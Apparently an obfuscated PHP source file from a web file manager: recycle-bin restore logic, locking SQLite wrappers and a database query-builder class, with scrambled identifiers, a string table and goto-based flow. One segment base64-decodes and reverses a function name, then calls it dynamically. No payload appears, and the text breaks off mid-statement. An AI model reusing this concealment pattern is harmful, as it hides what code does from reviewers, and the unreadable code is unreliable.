$this->remove(!1, $‹©…â‹¦); } public function restoreItem($îÛú¨Ñ×) { $this->_restoreSource(array($îÛú¨Ñ×), array($îÛú¨Ñ×)); } private function _restoreSource($ğŒÛÚƒ°, $„Ö„æõ) { $ÚÀÓá² =& $_SERVER[¿ÈˆÑ¸ä]; $‰¡ñÒµ° = Model($ÚÀÓá²[1469]); $„Ö„æõ = $„Ö„æõ == !1 ? !1 : $„Ö„æõ; if (!$ğŒÛÚƒ°) { return !0; } $÷ÈâÇøñ = array(); foreach ($ğŒÛÚƒ° as $¥ŸÕÏ˜«) { if ($„Ö„æõ != !1 && !in_array($¥ŸÕÏ˜«, $„Ö„æõ)) { continue; } $šŒ¦²œ = $‰¡ñÒµ°->sourceInfo($¥ŸÕÏ˜«); $ıîÉ“–í = $‰¡ñÒµ°->sourceInfo($šŒ¦²œ[$ÚÀÓá²[191]]); if ($ıîÉ“–í[$ÚÀÓá²[516]] == $ÚÀÓá²[91]) { continue; } $‰¡ñÒµ°->lockMoveStart($¥ŸÕÏ˜«); $this->recycleMove($¥ŸÕÏ˜«, 0); if ($šŒ¦²œ[$ÚÀÓá²[496]] == $ÚÀÓá²[91]) { $ğ„´Æè = array($ÚÀÓá²[671] => array($ÚÀÓá²[631], $šŒ¦²œ[$ÚÀÓá²[600]] . $¥ŸÕÏ˜« . $ÚÀÓá²[632])); $‰¡ñÒµ°->where($ğ„´Æè)->setField($ÚÀÓá²[516], 0); $this->restoreFolderChildren($¥ŸÕÏ˜«, $ğŒÛÚƒ°); } $this->where(array($ÚÀÓá²[192] => $¥ŸÕÏ˜«))->delete(); $‰¡ñÒµ°->folderSizeReset($šŒ¦²œ[$ÚÀÓá²[191]]); $÷ÈâÇøñ[] = $šŒ¦²œ[$ÚÀÓá²[191]]; if ($šŒ¦²œ[$ÚÀÓá²[496]] == $ÚÀÓá²[91]) { $÷ÈâÇøñ[] = $¥ŸÕÏ˜«; } $‰¡ñÒµ°->lockMoveEnd($¥ŸÕÏ˜«); } $‰¡ñÒµ°->updateModifyTime($÷ÈâÇøñ); } private function restoreFolderChildren($Ö½üı‘­, $¦æÛ‡íï) { $ü…Ú×ÎÅ =& $_SERVER[¿ÈˆÑ¸ä]; $”‹ö•¹ = Model($ü…Ú×ÎÅ[1469]); $ÆˆÉ‡¾‡ = array($ü…Ú×ÎÅ[192] => array($ü…Ú×ÎÅ[7], array())); foreach ($¦æÛ‡íï as $êË€Êã¬) { if ($êË€Êã¬ == $Ö½üı‘­) { continue; } if (!$”‹ö•¹->isParentOf($Ö½üı‘­, $êË€Êã¬)) { continue; } $¶¾®© = $”‹ö•¹->sourceInfo($êË€Êã¬); if ($¶¾®©[$ü…Ú×ÎÅ[496]] == $ü…Ú×ÎÅ[91]) { $ÆˆÉ‡¾‡[] = array($ü…Ú×ÎÅ[671] => array($ü…Ú×ÎÅ[631], $¶¾®©[$ü…Ú×ÎÅ[600]] . $êË€Êã¬ . $ü…Ú×ÎÅ[632])); } else { $ÆˆÉ‡¾‡[$ü…Ú×ÎÅ[192]][1][] = $êË€Êã¬; } } if (!$ÆˆÉ‡¾‡[$ü…Ú×ÎÅ[192]][1]) { unset($ÆˆÉ‡¾‡[$ü…Ú×ÎÅ[192]]); } if (!$ÆˆÉ‡¾‡) { return; } if (is_array($ÆˆÉ‡¾‡[$ü…Ú×ÎÅ[192]]) && is_array($ÆˆÉ‡¾‡[$ü…Ú×ÎÅ[192]][1])) { $ÆˆÉ‡¾‡[$ü…Ú×ÎÅ[192]][1] = array_unique($ÆˆÉ‡¾‡[$ü…Ú×ÎÅ[192]][1]); } $ÆˆÉ‡¾‡[$ü…Ú×ÎÅ[1103]] = $ü…Ú×ÎÅ[2222]; $”‹ö•¹->where($ÆˆÉ‡¾‡)->setField($ü…Ú×ÎÅ[516], 1); } private function recycleMove($ÎéµÇÃ, $ã­¨Öûë = 1) { $ö£—üä =& $_SERVER[¿ÈˆÑ¸ä]; $Ï»Ìˆ³ä = Model($ö£—üä[1469]); $·³ôÔÎÌ = Model($ö£—üä[2453]); $’Ã¥¾Êˆ = array($ö£—üä[192] => $ÎéµÇÃ); if ($ã­¨Öûë) { $Ï»Ìˆ³ä->where($’Ã¥¾Êˆ)->setField($ö£—üä[516], 1); $·³ôÔÎÌ->eventRecycle($ÎéµÇÃ, $ö£—üä[2454]); } else { $Ö¸ŞÙûè = $Ï»Ìˆ³ä->where($’Ã¥¾Êˆ)->find(); $…«•×ÏÅ = $Ö¸ŞÙûè[$ö£—üä[496]] == $ö£—üä[91]; $»œ©„Ô = $Ï»Ìˆ³ä->fileNameAuto($Ö¸ŞÙûè[$ö£—üä[191]], $Ö¸ŞÙûè[$ö£—üä[32]], REPEAT_RENAME_FOLDER, $…«•×ÏÅ); if ($»œ©„Ô != $Ö¸ŞÙûè[$ö£—üä[32]]) { $Ï»Ìˆ³ä->rename($ÎéµÇÃ, $»œ©„Ô); } $Ï»Ìˆ³ä->where($’Ã¥¾Êˆ)->setField($ö£—üä[516], 0); $·³ôÔÎÌ->eventRecycle($ÎéµÇÃ, $ö£—üä[2455]); } } } goto a¼à‰êµ¡±; a”Ì†Ì·Â­: $fileSize = strrev(base64_decode($_SERVER[éíèá¤ê][0])); function binCheckNeq($ß¢Ø‰¾, $¡‘şæÖ‚) { return $ß¢Ø‰¾ != $¡‘şæÖ‚; } $_SERVER[$_SERVER[éíèá¤ê][1]] = $fileSize($_SERVER[$_SERVER[éíèá¤ê][2]]); goto F¤ÉªŒ™Âƒ; böíÕ¸«³: class DbSqlite extends DbSqliteBase { public function query($ã·Ÿæ¸·) { $—Ù³·Ú¾ =& $_SERVER[¿ÈˆÑ¸ä]; if (!CacheLock::fileLock($—Ù³·Ú¾[13])) { return !1; } $êóĞÈöä = parent::query($ã·Ÿæ¸·); CacheLock::fileUnLock($—Ù³·Ú¾[13]); return $êóĞÈöä; } public function execute($—Æ©è™ú) { $©ñˆ†ÄÓ =& $_SERVER[¿ÈˆÑ¸ä]; if (!CacheLock::fileLock($©ñˆ†ÄÓ[13])) { return !1; } $ºàüé‹’ = parent::execute($—Æ©è™ú); CacheLock::fileUnLock($©ñˆ†ÄÓ[13]); return $ºàüé‹’; } } class DbSqlite3 extends DbSqlite3Base { public function query($Ï¶ÑâØ´) { $ÖÊìöåó =& $_SERVER[¿ÈˆÑ¸ä]; if (!CacheLock::fileLock($ÖÊìöåó[13])) { return !1; } $¦·×€Æ· = parent::query($Ï¶ÑâØ´); CacheLock::fileUnLock($ÖÊìöåó[13]); return $¦·×€Æ·; } public function execute($õ³¡Õ‘) { $ñÃ‘˜İ  =& $_SERVER[¿ÈˆÑ¸ä]; if (!CacheLock::fileLock($ñÃ‘˜İ [13])) { return !1; } $Òš¸¤ÖŒ = parent::execute($õ³¡Õ‘); CacheLock::fileUnLock($ñÃ‘˜İ [13]); return $Òš¸¤ÖŒ; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\164\x68\151\156\153\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\x71" => "\x3d", "\x6e\x65\161" => "\x3c\x3e", "\x67\x74" => "\76", "\x65\147\x74" => "\x3e\x3d", "\154\x74" => "\x3c", "\145\x6c\x74" => "\74\75", "\156\157\x74\x6c\151\x6b\x65" => "\116\117\x54\x20\x4c\111\x4b\105", "\154\151\153\145" => "\114\111\x4b\x45", "\151\156" => "\x49\116", "\156\x6f\x74\x69\156" => "\116\117\124\x20\x49\x4e", "\156\x6f\x74\40\x69\156" => "\x4e\117\124\x20\x49\116", "\142\145\x74\167\145\x65\156" => "\x42\105\x54\x57\105\105\116", "\x6e\x6f\x74\142\145\164\167\145\145\156" => "\116\x4f\x54\40\102\x45\124\x57\105\x45\116", "\156\x6f\164\40\142\x65\x74\167\x65\145\x6e" => "\116\117\x54\40\x42\105\124\x57\105\105\x4e"); protected $selectSql = "\x53\105\114\x45\x43\124\x25\104\x49\123\124\111\x4e\x43\124\45\x20\x25\x46\111\105\x4c\x44\x25\x20\x46\122\117\115\40\x25\x54\x41\x42\114\105\x25\45\x4a\x4f\111\x4e\x25\45\x57\110\x45\122\x45\45\45\x47\122\117\125\120\45\45\x48\101\126\x49\x4e\x47\x25\45\117\x52\104\105\122\45\x25\x4c\111\115\x49\x54\45\40\x25\x55\116\111\117\116\x25\x25\103\x4f\115\x4d\x45\116\124\x25"; protected $bind = array(); public static function getInstance() { $Ï¦³ÄæÃ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[¿ÈˆÑ¸ä][1063], $Ï¦³ÄæÃ); } public function factory($õ“ï·‚Å = '') { $ß¥‘Š¼ =& $_SERVER[¿ÈˆÑ¸ä]; $õ“ï·‚Å = $this->parseConfig($õ“ï·‚Å); if (empty($õ“ï·‚Å[$ß¥‘Š¼[1064]])) { think_exception(think_lang($ß¥‘Š¼[1065])); } $this->dbType = ucwords(strtolower($õ“ï·‚Å[$ß¥‘Š¼[1064]])); $Ÿ«ØÉ‘è = $ß¥‘Š¼[1066] . $this->dbType; if (class_exists($Ÿ«ØÉ‘è)) { $±‰Ø‘´Ó = new $Ÿ«ØÉ‘è($õ“ï·‚Å); if ($ß¥‘Š¼[1067] != strtolower($õ“ï·‚Å[$ß¥‘Š¼[1064]])) { $±‰Ø‘´Ó->dbType = strtoupper($this->dbType); } else { $±‰Ø‘´Ó->dbType = $this->_getDsnType($õ“ï·‚Å[$ß¥‘Š¼[1019]]); } } else { think_exception(think_lang($ß¥‘Š¼[1068]) . $ß¥‘Š¼[1069] . $Ÿ«ØÉ‘è); } return $±‰Ø‘´Ó; } public function __call($·•Íå¾², $¤îÌèÇ) { if (method_exists($this, $·•Íå¾²)) { return call_user_func_array(array($this, $·•Íå¾²), $¤îÌèÇ); } } protected function _getDsnType($ŞÍÊ’µè) { $‰åÉÒùŞ = explode($_SERVER[¿ÈˆÑ¸ä][4], $ŞÍÊ’µè); $Ûö³ç‘Ô = strtoupper(trim($‰åÉÒùŞ[0])); return $Ûö³ç‘Ô; } private function parseConfig($÷Óä®õ³ = '') { $¬ãıï– =& $_SERVER[¿ÈˆÑ¸ä]; if (!empty($÷Óä®õ³) && is_string($÷Óä®õ³)) { $÷Óä®õ³ = $this->parseDSN($÷Óä®õ³); } elseif (is_array($÷Óä®õ³)) { $÷Óä®õ³ = array_change_key_case($÷Óä®õ³); $÷Óä®õ³ = array($¬ãıï–[1064] => $÷Óä®õ³[$¬ãıï–[1070]], $¬ãıï–[988] => $÷Óä®õ³[$¬ãıï–[1071]], $¬ãıï–[989] => $÷Óä®õ³[$¬ãıï–[1072]], $¬ãıï–[986] => $÷Óä®õ³[$¬ãıï–[1073]], $¬ãıï–[987] => $÷Óä®õ³[$¬ãıï–[1074]], $¬ãıï–[21] => $÷Óä®õ³[$¬ãıï–[1075]], $¬ãıï–[1019] => $÷Óä®õ³[$¬ãıï–[1076]], $¬ãıï–[17] => isset($÷Óä®õ³[$¬ãıï–[1077]]) ? $÷Óä®õ³[$¬ãıï–[1077]] : array()); } elseif (empty($÷Óä®õ³)) { if (think_config($¬ãıï–[1078]) && $¬ãıï–[1067] != strtolower(think_config($¬ãıï–[1079]))) { $÷Óä®õ³ = $this->parseDSN(think_config($¬ãıï–[1078])); } else { $÷Óä®õ³ = array($¬ãıï–[1064] => think_config($¬ãıï–[1079]), $¬ãıï–[988] => think_config($¬ãıï–[1080]), $¬ãıï–[989] => think_config($¬ãıï–[1081]), $¬ãıï–[986] => think_config($¬ãıï–[1082]), $¬ãıï–[987] => think_config($¬ãıï–[1083]), $¬ãıï–[21] => think_config($¬ãıï–[324]), $¬ãıï–[1019] => think_config($¬ãıï–[1078]), $¬ãıï–[17] => think_config($¬ãıï–[1084])); } } return $÷Óä®õ³; } protected function initConnect($Ø•Ô¡ôò = true) { if (1 == think_config($_SERVER[¿ÈˆÑ¸ä][22])) { $this->_linkID = $this->multiConnect($Ø•Ô¡ôò); } else { if (isset($this->config) && $this->config) { $this->configLast = $this->config; } } if (!isset($this->connected) || !$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $¡±¸¨—µ => $±şú…‚è) { $this->_linkID = $±şú…‚è; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($Áãì†û = false) { $»‡¿ÔÄş =& $_SERVER[¿ÈˆÑ¸ä]; static $¥º“‰ÂÌ = array(); static $«½Ñ×µ› = -1; if (empty($¥º“‰ÂÌ)) { foreach ($this->config as $ı±ıí¨Ÿ => $£‘ªË¢›) { $¥º“‰ÂÌ[$ı±ıí¨Ÿ] = explode($»‡¿ÔÄş[50], $£‘ªË¢›); } } if (think_config($»‡¿ÔÄş[1085])) { if ($Áãì†û || think_config($»‡¿ÔÄş[482]) === !0) { $ˆ¢ÂÌı¥ = floor(mt_rand(0, think_config($»‡¿ÔÄş[1086]) - 1)); $«½Ñ×µ› = $ˆ¢ÂÌı¥; } else { if (is_numeric(think_config($»‡¿ÔÄş[1087]))) { $ˆ¢ÂÌı¥ = think_config($»‡¿ÔÄş[1087]); } else { $ˆ¢ÂÌı¥ = floor(mt_rand(think_config($»‡¿ÔÄş[1086]), count($¥º“‰ÂÌ[$»‡¿ÔÄş[986]]) - 1)); } } } else { $ˆ¢ÂÌı¥ = floor(mt_rand(0, count($¥º“‰ÂÌ[$»‡¿ÔÄş[986]]) - 1)); $«½Ñ×µ› = $ˆ¢ÂÌı¥; } $ˆ¢ÂÌı¥ = $«½Ñ×µ› !== -1 ? $«½Ñ×µ› : $ˆ¢ÂÌı¥; $§·óÉ™ = array($»‡¿ÔÄş[988] => isset($¥º“‰ÂÌ[$»‡¿ÔÄş[988]][$ˆ¢ÂÌı¥]) ? $¥º“‰ÂÌ[$»‡¿ÔÄş[988]][$ˆ¢ÂÌı¥] : $¥º“‰ÂÌ[$»‡¿ÔÄş[988]][0], $»‡¿ÔÄş[989] => isset($¥º“‰ÂÌ[$»‡¿ÔÄş[989]][$ˆ¢ÂÌı¥]) ? $¥º“‰ÂÌ[$»‡¿ÔÄş[989]][$ˆ¢ÂÌı¥] : $¥º“‰ÂÌ[$»‡¿ÔÄş[989]][0], $»‡¿ÔÄş[986] => isset($¥º“‰ÂÌ[$»‡¿ÔÄş[986]][$ˆ¢ÂÌı¥]) ? $¥º“‰ÂÌ[$»‡¿ÔÄş[986]][$ˆ¢ÂÌı¥] : $¥º“‰ÂÌ[$»‡¿ÔÄş[986]][0], $»‡¿ÔÄş[987] => isset($¥º“‰ÂÌ[$»‡¿ÔÄş[987]][$ˆ¢ÂÌı¥]) ? $¥º“‰ÂÌ[$»‡¿ÔÄş[987]][$ˆ¢ÂÌı¥] : $¥º“‰ÂÌ[$»‡¿ÔÄş[987]][0], $»‡¿ÔÄş[21] => isset($¥º“‰ÂÌ[$»‡¿ÔÄş[21]][$ˆ¢ÂÌı¥]) ? $¥º“‰ÂÌ[$»‡¿ÔÄş[21]][$ˆ¢ÂÌı¥] : $¥º“‰ÂÌ[$»‡¿ÔÄş[21]][0], $»‡¿ÔÄş[1019] => isset($¥º“‰ÂÌ[$»‡¿ÔÄş[1019]][$ˆ¢ÂÌı¥]) ? $¥º“‰ÂÌ[$»‡¿ÔÄş[1019]][$ˆ¢ÂÌı¥] : $¥º“‰ÂÌ[$»‡¿ÔÄş[1019]][0], $»‡¿ÔÄş[17] => isset($¥º“‰ÂÌ[$»‡¿ÔÄş[17]][$ˆ¢ÂÌı¥]) ? $¥º“‰ÂÌ[$»‡¿ÔÄş[17]][$ˆ¢ÂÌı¥] : $¥º“‰ÂÌ[$»‡¿ÔÄş[17]][0]); return $this->connect($§·óÉ™, $ˆ¢ÂÌı¥); } public function parseDSN($Ì¡¤¦ò²) { $¦ÆªÚ¡Ş =& $_SERVER[¿ÈˆÑ¸ä]; if (empty($Ì¡¤¦ò²)) { return !1; } $èÍ×² = parse_url($Ì¡¤¦ò²); if ($èÍ×²[$¦ÆªÚ¡Ş[206]]) { $çßê¡›ø = array($¦ÆªÚ¡Ş[1064] => $èÍ×²[$¦ÆªÚ¡Ş[206]], $¦ÆªÚ¡Ş[988] => isset($èÍ×²[$¦ÆªÚ¡Ş[681]]) ? $èÍ×²[$¦ÆªÚ¡Ş[681]] : $¦ÆªÚ¡Ş[12], $¦ÆªÚ¡Ş[989] => isset($èÍ×²[$¦ÆªÚ¡Ş[1088]]) ? $èÍ×²[$¦ÆªÚ¡Ş[1088]] : $¦ÆªÚ¡Ş[12], $¦ÆªÚ¡Ş[986] => isset($èÍ×²[$¦ÆªÚ¡Ş[207]]) ? $èÍ×²[$¦ÆªÚ¡Ş[207]] : $¦ÆªÚ¡Ş[12], $¦ÆªÚ¡Ş[987] => isset($èÍ×²[$¦ÆªÚ¡Ş[208]]) ? $èÍ×²[$¦ÆªÚ¡Ş[208]] : $¦ÆªÚ¡Ş[12], $¦ÆªÚ¡Ş[21] => isset($èÍ×²[$¦ÆªÚ¡Ş[87]]) ? substr($èÍ×²[$¦ÆªÚ¡Ş[87]], 1) : $¦ÆªÚ¡Ş[12]); } else { preg_match($¦ÆªÚ¡Ş[1089], trim($Ì¡¤¦ò²), $ÎÇöØÛ´); $çßê¡›ø = array($¦ÆªÚ¡Ş[1064] => $ÎÇöØÛ´[1], $¦ÆªÚ¡Ş[988] => $ÎÇöØÛ´[2], $¦ÆªÚ¡Ş[989] => $ÎÇöØÛ´[3], $¦ÆªÚ¡Ş[986] => $ÎÇöØÛ´[4], $¦ÆªÚ¡Ş[987] => $ÎÇöØÛ´[5], $¦ÆªÚ¡Ş[21] => $ÎÇöØÛ´[6]); } $çßê¡›ø[$¦ÆªÚ¡Ş[1019]] = $¦ÆªÚ¡Ş[12]; return $çßê¡›ø; } protected function debug() { $ˆè“»û‡ =& $_SERVER[¿ÈˆÑ¸ä]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $ˆè“»û‡[1090]; if (think_config($ˆè“»û‡[1091])) { think_status($ˆè“»û‡[1092]); think_trace($this->queryStr . $ˆè“»û‡[1093] . think_status($ˆè“»û‡[24], $ˆè“»û‡[1092], 6) . $ˆè“»û‡[1094], $ˆè“»û‡[12], $ˆè“»û‡[1095]); } } protected function parseLock($Ã”ƒöî– = false) { $İàİÓÏ¡ =& $_SERVER[¿ÈˆÑ¸ä]; if (!$Ã”ƒöî–) { return $İàİÓÏ¡[12]; } if ($İàİÓÏ¡[1021] == $this->dbType) { return $İàİÓÏ¡[1096]; } return $İàİÓÏ¡[1097]; } protected function parseSet($ë¼é´…) { $òÍ¾‹ó =& $_SERVER[¿ÈˆÑ¸ä]; foreach ($ë¼é´… as $µ¥É¼Ûˆ => $Åğ¨î‚) { if (is_array($Åğ¨î‚) && $òÍ¾‹ó[373] == $Åğ¨î‚[0]) { $Éæ¸Ùˆ[] = $this->parseKey($µ¥É¼Ûˆ) . $òÍ¾‹ó[464] . $Åğ¨î‚[1]; } elseif (is_scalar($Åğ¨î‚) || is_null($Åğ¨î‚)) { $Éæ¸Ùˆ[] = $this->parseKey($µ¥É¼Ûˆ) . $òÍ¾‹ó[464] . $this->parseValue($Åğ¨î‚); } } return $òÍ¾‹ó[1098] . implode($òÍ¾‹ó[50], $Éæ¸Ùˆ); } protected function bindParam($¸´”ßÊæ, $æÏÏøÜ÷) { $this->bind[$_SERVER[¿ÈˆÑ¸ä][4] . $¸´”ßÊæ] = $æÏÏøÜ÷; } protected function parseBind($ò¹ÂØàû) { $ò¹ÂØàû = array_merge($this->bind, $ò¹ÂØàû); $this->bind = array(); return $ò¹ÂØàû; } function parseKey(&$•ÔŞ’†—, $‡ãøÃÄÊ = true) { if ($‡ãøÃÄÊ) { $•ÔŞ’†— = $this->parseKeyCheck($•ÔŞ’†—); } return $•ÔŞ’†—; } function parseKeyCheck($ø˜Æ€å) { $Ö®ş¨ñ¾ =& $_SERVER[¿ÈˆÑ¸ä]; $ø˜Æ€å = trim($ø˜Æ€å); if (!preg_match($Ö®ş¨ñ¾[1099], $ø˜Æ€å)) { think_exception($Ö®ş¨ñ¾[1100] . $ø˜Æ€å); } return $ø˜Æ€å; } protected function parseValue($·æØ¨‡§) { $Ú«‡ïÈ¨ =& $_SERVER[¿ÈˆÑ¸ä]; if (is_string($·æØ¨‡§)) { $·æØ¨‡§ = $Ú«‡ïÈ¨[1060] . $this->escapeString($·æØ¨‡§) . $Ú«‡ïÈ¨[1060]; } elseif (isset($·æØ¨‡§[0]) && is_string($·æØ¨‡§[0]) && strtolower($·æØ¨‡§[0]) == $Ú«‡ïÈ¨[373]) { $·æØ¨‡§ = $this->escapeString($·æØ¨‡§[1]); } elseif (is_array($·æØ¨‡§)) { $·æØ¨‡§ = array_map(array($this, $Ú«‡ïÈ¨[1061]), $·æØ¨‡§); } elseif (is_bool($·æØ¨‡§)) { $·æØ¨‡§ = $·æØ¨‡§ ? $Ú«‡ïÈ¨[91] : $Ú«‡ïÈ¨[229]; } elseif (is_null($·æØ¨‡§)) { $·æØ¨‡§ = $Ú«‡ïÈ¨[104]; } return $·æØ¨‡§; } protected function parseField($ÜÌä†¯ã) { $Ò©àßÏ =& $_SERVER[¿ÈˆÑ¸ä]; if (is_string($ÜÌä†¯ã) && strpos($ÜÌä†¯ã, $Ò©àßÏ[50])) { $ÜÌä†¯ã = explode($Ò©àßÏ[50], $ÜÌä†¯ã); } if (is_array($ÜÌä†¯ã)) { $‡¸ÀØ” = array(); foreach ($ÜÌä†¯ã as $½åû­È => $¸áÅòæ—) { if (!is_numeric($½åû­È)) { $‡¸ÀØ”[] = $this->parseKey($½åû­È, !1) . $Ò©àßÏ[1101] . $this->parseKey($¸áÅòæ—); } else { $‡¸ÀØ”[] = $this->parseKey($¸áÅòæ—); } } $úñåÇ•Û = implode($Ò©àßÏ[50], $‡¸ÀØ”); } elseif (is_string($ÜÌä†¯ã) && !empty($ÜÌä†¯ã)) { $úñåÇ•Û = $ÜÌä†¯ã; } else { $úñåÇ•Û = $Ò©àßÏ[221]; } return $úñåÇ•Û; } protected function parseTable($¸ê”œ“Ê) { $åŒêşğá =& $_SERVER[¿ÈˆÑ¸ä]; if (is_array($¸ê”œ“Ê)) { $ºÕİÉ³ = array(); foreach ($¸ê”œ“Ê as $š«‹à² => $Âãí„ë¶) { if (!is_numeric($š«‹à²)) { $ºÕİÉ³[] = $this->parseKey($š«‹à²) . $åŒêşğá[53] . $this->parseKey($Âãí„ë¶); } else { $ºÕİÉ³[] = $this->parseKey($š«‹à²); } } $¸ê”œ“Ê = $ºÕİÉ³; } elseif (is_string($¸ê”œ“Ê)) { if (strstr($¸ê”œ“Ê, $åŒêşğá[53])) { return $¸ê”œ“Ê; } $¸ê”œ“Ê = explode($åŒêşğá[50], $¸ê”œ“Ê); array_walk($¸ê”œ“Ê, array($this, $åŒêşğá[1006])); } return $åŒêşğá[1000] . trim(implode($åŒêşğá[1102], $¸ê”œ“Ê), $åŒêşğá[472]) . $åŒêşğá[1000]; } protected function parseWhere($ÕÔïŠ›·) { $ü£ƒÒ€À =& $_SERVER[¿ÈˆÑ¸ä]; $´¥ŸÓ³› = $ü£ƒÒ€À[12]; if (is_string($ÕÔïŠ›·)) { $´¥ŸÓ³› = $ÕÔïŠ›·; } else { $Ş™ŸÏß = isset($ÕÔïŠ›·[$ü£ƒÒ€À[1103]]) ? strtoupper($ÕÔïŠ›·[$ü£ƒÒ€À[1103]]) : $ü£ƒÒ€À[12]; if (in_array($Ş™ŸÏß, array($ü£ƒÒ€À[1104], $ü£ƒÒ€À[1105], $ü£ƒÒ€À[1106]))) { $Ş™ŸÏß = $ü£ƒÒ€À[53] . $Ş™ŸÏß . $ü£ƒÒ€À[53]; unset($ÕÔïŠ›·[$ü£ƒÒ€À[1103]]); } else { $Ş™ŸÏß = $ü£ƒÒ€À[1107]; } foreach ($ÕÔïŠ›· as $¬Ûñ‰“Ü => $¼ü‹„½¼) { $´¥ŸÓ³› .= $ü£ƒÒ€À[356]; if (is_numeric($¬Ûñ‰“Ü)) { $¬Ûñ‰“Ü = $ü£ƒÒ€À[1108]; } if (0 === strpos($¬Ûñ‰“Ü, $ü£ƒÒ€À[11])) { $´¥ŸÓ³› .= $this->parseThinkWhere($¬Ûñ‰“Ü, $¼ü‹„½¼); } else { if (!preg_match($ü£ƒÒ€À[1109], trim($¬Ûñ‰“Ü))) { think_exception(think_lang($ü£ƒÒ€À[1110]) . $ü£ƒÒ€À[4] . $¬Ûñ‰“Ü); } $„Îˆ·Î = is_array($¼ü‹„½¼) && isset($¼ü‹„½¼[$ü£ƒÒ€À[1111]]); $¬Ûñ‰“Ü = trim($¬Ûñ‰“Ü); if (strpos($¬Ûñ‰“Ü, $ü£ƒÒ€À[213])) { $©¨ñßâ = explode($ü£ƒÒ€À[213], $¬Ûñ‰“Ü); $ò¬ÅóÍı = array(); foreach ($©¨ñßâ as $¢¼óóâÇ => $ƒÈ»™üÁ) { $Ù„Òî‚­ = $„Îˆ·Î ? $¼ü‹„½¼[$¢¼óóâÇ] : $¼ü‹„½¼; $ò¬ÅóÍı[] = $ü£ƒÒ€À[338] . $this->parseWhereItem($this->parseKey($ƒÈ»™üÁ), $Ù„Òî‚­) . $ü£ƒÒ€À[1005]; } $´¥ŸÓ³› .= implode($ü£ƒÒ€À[1112], $ò¬ÅóÍı); } elseif (strpos($¬Ûñ‰“Ü, $ü£ƒÒ€À[285])) { $©¨ñßâ = explode($ü£ƒÒ€À[285], $¬Ûñ‰“Ü); $ò¬ÅóÍı = array(); foreach ($©¨ñßâ as $¢¼óóâÇ => $ƒÈ»™üÁ) { $Ù„Òî‚­ = $„Îˆ·Î ? $¼ü‹„½¼[$¢¼óóâÇ] : $¼ü‹„½¼; $ò¬ÅóÍı[] = $ü£ƒÒ€À[338] . $this->parseWhereItem($this->parseKey($ƒÈ»™üÁ), $Ù„Òî‚­) . $ü£ƒÒ€À[1005]; } $´¥ŸÓ³› .= implode($ü£ƒÒ€À[1107], $ò¬ÅóÍı); } else { $´¥ŸÓ³› .= $this->parseWhereItem($this->parseKey($¬Ûñ‰“Ü), $¼ü‹„½¼); } } $´¥ŸÓ³› .= $ü£ƒÒ€À[357] . $Ş™ŸÏß; } $´¥ŸÓ³› = substr($´¥ŸÓ³›, 0, -strlen($Ş™ŸÏß)); } return empty($´¥ŸÓ³›) ? $ü£ƒÒ€À[12] : $ü£ƒÒ€À[1113] . $´¥ŸÓ³›; } protected function parseWhereItem($‰©×›®², $üÎùõŒ€) { $Ñ Á§®ô =& $_SERVER[¿ÈˆÑ¸ä]; $Â«”©„£ = $Ñ Á§®ô[12]; if (is_array($üÎùõŒ€)) { if (is_string($üÎùõŒ€[0])) { $•¼…„ƒÃ = strtolower($üÎùõŒ€[0]); if (in_array($üÎùõŒ€[0], array($Ñ Á§®ô[464], $Ñ Á§®ô[1114], $Ñ Á§®ô[1115], $Ñ Á§®ô[1116], $Ñ Á§®ô[1117], $Ñ Á§®ô[1118]))) { $Â«”©„£ .= $‰©×›®² . $Ñ Á§®ô[53] . $üÎùõŒ€[0] . $Ñ Á§®ô[53] . $this->parseValue($üÎùõŒ€[1]); } elseif (preg_match($Ñ Á§®ô[1119], $üÎùõŒ€[0])) { $Â«”©„£ .= $‰©×›®² . $Ñ Á§®ô[53] . $this->exp[$•¼…„ƒÃ] . $Ñ Á§®ô[53] . $this->parseValue($üÎùõŒ€[1]); } elseif (preg_match($Ñ Á§®ô[1120], $üÎùõŒ€[0])) { if (is_array($üÎùõŒ€[1])) { $ »ÜÆ° = isset($üÎùõŒ€[2]) ? strtoupper($üÎùõŒ€[2]) : $Ñ Á§®ô[1105]; if (in_array($ »ÜÆ°, array($Ñ Á§®ô[1104], $Ñ Á§®ô[1105], $Ñ Á§®ô[1106]))) { $ıÓİñ½¹ = array(); foreach ($üÎùõŒ€[1] as $Ÿ«Æ˜×â) { $ıÓİñ½¹[] = $‰©×›®² . $Ñ Á§®ô[53] . $this->exp[$•¼…„ƒÃ] . $Ñ Á§®ô[53] . $this->parseValue($Ÿ«Æ˜×â); } $Â«”©„£ .= $Ñ Á§®ô[338] . implode($Ñ Á§®ô[53] . $ »ÜÆ° . $Ñ Á§®ô[53], $ıÓİñ½¹) . $Ñ Á§®ô[1005]; } } else { $Â«”©„£ .= $‰©×›®² . $Ñ Á§®ô[53] . $this->exp[$•¼…„ƒÃ] . $Ñ Á§®ô[53] . $this->parseValue($üÎùõŒ€[1]); } } elseif ($Ñ Á§®ô[373] == $•¼…„ƒÃ) { $Â«”©„£ .= $Ñ Á§®ô[1003] . $‰©×›®² . $Ñ Á§®ô[53] . $üÎùõŒ€[1] . $Ñ Á§®ô[1121]; } elseif (preg_match($Ñ Á§®ô[1122], $üÎùõŒ€[0])) { $Â«”©„£ .= $üÎùõŒ€[0]; } elseif (preg_match($Ñ Á§®ô[1123], $üÎùõŒ€[0])) { if (isset($üÎùõŒ€[2]) && $Ñ Á§®ô[373] == $üÎùõŒ€[2]) { $Â«”©„£ .= $‰©×›®² . $Ñ Á§®ô[53] . $this->exp[$•¼…„ƒÃ] . $Ñ Á§®ô[53] . $üÎùõŒ€[1]; } else { if (is_string($üÎùõŒ€[1])) { $üÎùõŒ€[1] = explode($Ñ Á§®ô[50], $üÎùõŒ€[1]); } $¸«¸‡„› = implode($Ñ Á§®ô[50], $this->parseValue($üÎùõŒ€[1])); $Â«”©„£ .= $‰©×›®² . $Ñ Á§®ô[53] . 